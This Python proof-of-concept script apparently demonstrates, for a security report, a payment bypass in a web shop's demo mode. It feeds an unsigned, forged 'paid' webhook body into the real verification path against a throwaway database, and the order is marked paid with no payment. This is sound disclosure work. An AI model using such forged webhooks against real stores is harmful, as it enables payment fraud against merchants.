"""Minimal PoC for the demo-mode payment bypass — exercises the EXACT code path the
webhook endpoint uses (provider.verify_webhook -> orders.apply_payment_result), with NO
authentication and NO signature, against a throwaway temp DB. No HTTP server needed.
"""
import asyncio
import os
import pathlib
import tempfile

tmpdb = pathlib.Path(tempfile.gettempdir()) / "dc_poc.db"
if tmpdb.exists():
    tmpdb.unlink()
os.environ["DB_URL"] = f"sqlite:///{tmpdb.as_posix()}"
os.environ["VIVA_MODE"] = "demo"   # the shipped default (config.py + .env.example)
os.environ["SECRET_KEY"] = "poc"

from sqlmodel import Session, select          # noqa: E402
from app.db import engine, init_db            # noqa: E402
from app.models import Order                  # noqa: E402
from app import orders as orders_mod          # noqa: E402
from app.payments import get_provider         # noqa: E402


async def main():
    init_db()
    with Session(engine) as s:
        s.add(Order(number="DC-POC-0001", status="pending", customer_name="PoC",
                    customer_email="poc@example.com", subtotal=999.0, total=999.0,
                    vat_amount=0.0, vat_rate=24.0, currency="EUR"))
        s.commit()

    provider = get_provider()  # VivaProvider(mode='demo')
    print("provider mode:", provider.mode)

    # An attacker's forged webhook body — no signature, no secret, arbitrary order code.
    forged = b'{"order_code": "DC-POC-0001", "status": "paid"}'
    result = await provider.verify_webhook(request=None, raw_body=forged)
    print("verify_webhook accepted forged body ->", result)

    with Session(engine) as s:
        applied = orders_mod.apply_payment_result(s, result)
        print("apply_payment_result returned:", applied)
        o = s.exec(select(Order).where(Order.number == "DC-POC-0001")).first()
        print(f"order status AFTER forged webhook: ***{o.status}***  txn={o.viva_transaction_id}")
        print("RESULT:", "PAYMENT FORGED (order marked paid with no payment)"
              if o.status == "paid" else "not forged")

    if tmpdb.exists():
        tmpdb.unlink()


asyncio.run(main())
